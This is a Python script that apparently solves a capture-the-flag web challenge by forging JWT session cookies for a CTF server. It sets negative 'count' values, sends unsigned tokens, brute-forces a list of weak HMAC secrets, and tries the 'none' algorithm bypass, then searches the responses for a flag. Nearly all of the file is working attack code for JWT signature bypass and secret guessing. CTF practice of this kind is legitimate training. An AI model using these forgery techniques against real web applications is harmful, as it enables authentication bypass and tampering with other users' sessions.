#!/usr/bin/env python3
"""
JWT Manipulation for Lower Numbers Challenge
Based on hint: "For those who struggle on the Counted, use burp and https://www.jwt.io/ to play around with the numbers"
"""

import requests
import base64
import json
import hmac
import hashlib

def create_jwt_payload(count):
    """Create a JWT payload with the specified count"""
    payload = {"count": count}
    payload_json = json.dumps(payload, separators=(',', ':'))
    encoded_payload = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
    return encoded_payload

def create_jwt_header(alg="HS256"):
    """Create a JWT header"""
    header = {"alg": alg, "typ": "JWT"}
    header_json = json.dumps(header, separators=(',', ':'))
    encoded_header = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
    return encoded_header

def sign_jwt(header, payload, secret):
    """Sign a JWT with HMAC SHA256"""
    message = f"{header}.{payload}"
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    encoded_sig = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    return encoded_sig

def test_jwt_token(jwt_token):
    """Test a JWT token with the challenge server"""
    base_url = "https://cpp.bootupctf.net:8085"
    
    # Create session with the JWT cookie
    session = requests.Session()
    session.cookies.set('d', jwt_token, domain='cpp.bootupctf.net')
    
    # Check the count
    response = session.get(base_url)
    print(f"Page response: {response.text[:200]}...")
    
    # Try to get the flag
    flag_response = session.get(f"{base_url}/flag")
    print(f"Flag response: {flag_response.text[:200]}...")
    
    # Look for flag pattern
    import re
    flag_patterns = [
        r'[a-zA-Z0-9_]+\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'bootup\{[^}]+\}',
        r'mne\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, flag_response.text, re.IGNORECASE)
        if matches:
            print(f"🚩 FLAG FOUND: {matches[0]}")
            return matches[0]
    
    return None

def main():
    print("🔐 JWT Manipulation for Lower Numbers Challenge")
    print("=" * 60)
    
    # Common weak secrets to try
    weak_secrets = [
        "secret", "password", "123456", "admin", "key", "jwt", "token",
        "your-256-bit-secret", "mysecretkey", "supersecret", "challenge",
        "bootup", "ctf", "flag", "", "null", "none"
    ]
    
    header = create_jwt_header("HS256")
    
    # Try different negative count values
    count_values = [-1, -10, -100, 0]
    
    for count in count_values:
        print(f"\n🧪 Testing count value: {count}")
        payload = create_jwt_payload(count)
        
        # First try without signature (some servers don't validate)
        unsigned_jwt = f"{header}.{payload}."
        print(f"Trying unsigned JWT: {unsigned_jwt}")
        flag = test_jwt_token(unsigned_jwt)
        if flag:
            return flag
        
        # Try with weak secrets
        for secret in weak_secrets:
            signature = sign_jwt(header, payload, secret)
            jwt_token = f"{header}.{payload}.{signature}"
            print(f"Trying secret '{secret}': {jwt_token[:50]}...")
            
            flag = test_jwt_token(jwt_token)
            if flag:
                print(f"✅ Success with secret: '{secret}'")
                return flag
    
    # Try "none" algorithm attack
    print(f"\n🚫 Testing 'none' algorithm attack...")
    none_header = create_jwt_header("none")
    
    for count in [-1, 0]:
        payload = create_jwt_payload(count)
        none_jwt = f"{none_header}.{payload}."
        print(f"Trying 'none' algorithm with count {count}: {none_jwt}")
        
        flag = test_jwt_token(none_jwt)
        if flag:
            return flag
    
    print(f"\n❌ Could not solve automatically. Manual analysis needed.")
    print(f"💡 Try using jwt.io to decode and modify the tokens manually")
    print(f"💡 Use Burp Suite to intercept and modify the JWT cookie")
    
    return None

if __name__ == "__main__":
    flag = main()
    if flag:
        print(f"\n🎉 Challenge Solved! Flag: {flag}")
